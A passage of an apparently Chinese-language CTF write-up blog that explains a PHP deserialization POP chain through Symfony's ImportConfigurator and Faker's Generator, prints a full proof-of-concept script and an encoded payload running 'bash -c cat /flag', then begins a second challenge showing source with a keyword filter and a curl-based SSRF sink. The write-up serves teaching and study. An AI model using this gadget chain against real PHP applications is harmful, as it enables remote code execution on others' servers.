+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parent</span><span class="o">-&gt;</span><span class="na">addCollection</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">final</span> <span class="k">public</span> <span class="k">function</span> <span class="nf">prefix</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span> <span class="nx">bool</span> <span class="nv">$trailingSlashOnRoot</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">\is_array</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="o">-&gt;</span><span class="na">addPrefix</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$trailingSlashOnRoot</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$rootPath</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">Route</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">),</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">))</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">();</span>
+                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="o">-&gt;</span><span class="na">all</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$route</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nv">$route</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">()</span> <span class="o">===</span> <span class="nv">$rootPath</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$route</span><span class="o">-&gt;</span><span class="na">setPath</span><span class="p">(</span><span class="nx">rtrim</span><span class="p">(</span><span class="nv">$rootPath</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">));</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$prefix</span> <span class="k">as</span> <span class="nv">$locale</span> <span class="o">=&gt;</span> <span class="nv">$localePrefix</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$prefix</span><span class="p">[</span><span class="nv">$locale</span><span class="p">]</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$localePrefix</span><span class="p">),</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="o">-&gt;</span><span class="na">all</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$route</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="k">null</span> <span class="o">===</span> <span class="nv">$locale</span> <span class="o">=</span> <span class="nv">$route</span><span class="o">-&gt;</span><span class="na">getDefault</span><span class="p">(</span><span class="s1">&#39;_locale&#39;</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="o">-&gt;</span><span class="na">remove</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$prefix</span> <span class="k">as</span> <span class="nv">$locale</span> <span class="o">=&gt;</span> <span class="nv">$localePrefix</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$localizedRoute</span> <span class="o">=</span> <span class="k">clone</span> <span class="nv">$route</span><span class="p">;</span>
+                        <span class="nv">$localizedRoute</span><span class="o">-&gt;</span><span class="na">setDefault</span><span class="p">(</span><span class="s1">&#39;_locale&#39;</span><span class="p">,</span> <span class="nv">$locale</span><span class="p">);</span>
+                        <span class="nv">$localizedRoute</span><span class="o">-&gt;</span><span class="na">setDefault</span><span class="p">(</span><span class="s1">&#39;_canonical_route&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+                        <span class="nv">$localizedRoute</span><span class="o">-&gt;</span><span class="na">setPath</span><span class="p">(</span><span class="nv">$localePrefix</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="nv">$trailingSlashOnRoot</span> <span class="o">&amp;&amp;</span> <span class="s1">&#39;/&#39;</span> <span class="o">===</span> <span class="nv">$route</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">()</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="nv">$route</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">()));</span>
+                        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">(</span><span class="nv">$name</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$locale</span><span class="p">,</span> <span class="nv">$localizedRoute</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">[</span><span class="nv">$locale</span><span class="p">]))</span> <span class="p">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">\InvalidArgumentException</span><span class="p">(</span><span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;Route &#34;%s&#34; with locale &#34;%s&#34; is missing a corresponding prefix in its parent collection.&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$locale</span><span class="p">));</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$route</span><span class="o">-&gt;</span><span class="na">setPath</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">[</span><span class="nv">$locale</span><span class="p">]</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="nv">$trailingSlashOnRoot</span> <span class="o">&amp;&amp;</span> <span class="s1">&#39;/&#39;</span> <span class="o">===</span> <span class="nv">$route</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">()</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="nv">$route</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">()));</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$route</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">final</span> <span class="k">public</span> <span class="k">function</span> <span class="nf">namePrefix</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$namePrefix</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="o">-&gt;</span><span class="na">addNamePrefix</span><span class="p">(</span><span class="nv">$namePrefix</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625171343.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625171343.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625171343.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625171343.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200625171343.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200625171343.png" />
+这里析构函数调用了<code>addCollection</code>方法</p>
+<h3 id="pop链构造">pop链构造</h3>
+<p>我们还知道，当<code>__destruct</code>销毁对象的时候会自动调用该方法，而调用一个不存在的方法时会自动调用<code>__call()</code>，所以现在pop链就清楚了，先创建一个<code>Generator</code>实例，然后将其赋值给<code>ImportConfigurator</code>的<code>$parent</code>。当<code>ImportConfigurator</code>自动销毁时会调用<code>Generator</code>的<code>addCollection</code>方法，但是<code>addCollection</code>方法在<code>Generator</code>中不存在，所以自动调用<code>Generator</code>中的<code>__call()</code>方法，而<code>__call()</code>方法调用了<code>format</code>方法，<code>format</code>里面的两个参数都可控，这样就可以RCE了。</p>
+<p>poc:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">namespace</span> <span class="nx">Symfony\Component\Routing\Loader\Configurator</span> <span class="p">{</span>
+    <span class="k">class</span> <span class="nc">ImportConfigurator</span><span class="p">{</span>
+        <span class="k">private</span> <span class="nv">$parent</span><span class="p">;</span>
+        <span class="k">private</span> <span class="nv">$route</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span> <span class="nv">$parent</span><span class="p">,</span> <span class="nv">$route</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parent</span> <span class="o">=</span> <span class="nv">$parent</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span> <span class="o">=</span> <span class="nv">$route</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parent</span><span class="o">-&gt;</span><span class="na">addCollection</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+
+<span class="k">namespace</span> <span class="nx">Faker</span><span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Generator</span>
+    <span class="p">{</span>
+        <span class="k">protected</span> <span class="nv">$formatters</span><span class="p">;</span>
+
+        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$forma</span><span class="p">){</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span> <span class="o">=</span> <span class="nv">$forma</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">format</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">,</span> <span class="nv">$arguments</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">),</span> <span class="nv">$arguments</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">]))</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">];</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">namespace</span><span class="p">{</span>
+    <span class="nv">$fs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;addCollection&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;system&#34;</span><span class="p">);</span>
+    <span class="nv">$gen</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Faker\Generator</span><span class="p">(</span><span class="nv">$fs</span><span class="p">);</span>
+    <span class="nv">$pb</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Symfony\Component\Routing\Loader\Configurator\ImportConfigurator</span><span class="p">(</span><span class="nv">$gen</span><span class="p">,</span><span class="s2">&#34;bash -c &#39;cat /flag&#39;&#34;</span><span class="p">);</span>
+    <span class="k">echo</span><span class="p">(</span><span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$pb</span><span class="p">)));</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">O%3A64%3A%22Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%22%3A2%3A%7Bs%3A72%3A%22%00Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%00parent%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3Ba%3A1%3A%7Bs%3A13%3A%22addCollection%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A71%3A%22%00Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%00route%22%3Bs%3A19%3A%22bash+-c+%27cat+%2Fflag%27%22%3B%7D
+</code></pre></td></tr></table>
+</div>
+</div><p>反序列化点直接全局搜索<code>unserialize</code>,发现<code>/index</code>路由：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625172550.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625172550.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625172550.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625172550.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200625172550.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200625172550.png" /></p>
+<p><code>GET</code>传值参数为p，拿到flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625172413.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625172413.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625172413.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625172413.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200625172413.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200625172413.png" /></p>
+<h2 id="do-you-know">do you know</h2>
+<p>这题很让人无语
+index.php:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="c1">#本题无法访问外网
+</span><span class="c1">#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了
+</span><span class="c1">#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好
+</span><span class="c1">#there is xxe.php
+</span><span class="c1"></span><span class="nv">$poc</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/log|flag|hist|dict|etc|file|write/i&#34;</span> <span class="p">,</span><span class="nv">$poc</span><span class="p">)){</span>
+                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no hacker&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="nv">$ids</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="nv">$poc</span><span class="p">);</span>
+<span class="nv">$a_key</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="nv">$ids</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">0</span><span class="p">];</span>
+<span class="nv">$b_key</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="nv">$ids</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">0</span><span class="p">];</span>
+<span class="nv">$a_value</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="nv">$ids</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">1</span><span class="p">];</span>
+<span class="nv">$b_value</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="nv">$ids</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">1</span><span class="p">];</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$a_key</span><span class="o">||!</span><span class="nv">$b_key</span><span class="o">||!</span><span class="nv">$a_value</span><span class="o">||!</span><span class="nv">$b_value</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;我什么都没有~&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$a_key</span><span class="o">==</span><span class="nv">$b_key</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;trick&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$a_value</span><span class="o">!==</span><span class="nv">$b_value</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;be it so&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="nv">$url</span><span class="o">=</span><span class="nv">$value</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">!=</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">#add_debug_log($param, &#39;post_data&#39;);
+</span><span class="c1"></span>        <span class="c1">// 设置超时
+</span><span class="c1"></span>        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_TIMEOUT</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">// 设置超时
+</span><span class="c1"></span>        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_TIMEOUT</span><span class="p">,</span> <span class="mi">180</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+
+    <span class="c1">// 设置header
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$header</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&#34;content-type: multipart/form-data; charset=UTF-8&#34;</span><span class="p">;</span>
+        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$header</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;xml&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$has_json</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$header</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&#34;content-type: application/json; charset=UTF-8&#34;</span><span class="p">;</span>
+        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$header</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#39;);
+</span><span class="c1"></span>    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_AUTOREFERER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="c1">// dump($param);
+</span><span class="c1"></span>    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nv">$param</span><span class="p">);</span>
+    <span class="c1">// 要求结果为字符串且输出到屏幕上
+</span><span class="c1"></span>    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="c1">// 使用证书：cert 与 key 分别属于两个.pem文件
+</span><span class="c1"></span>
+
+    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>读完源码，可以知道前两个<code>QUERY_STRING</code>要键名不同值相同，然后会获取最后一个值作为<code>url</code>，然后使用php的curl模块进行访问
+看到提示xxe.php
+先访问xxe.php，源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
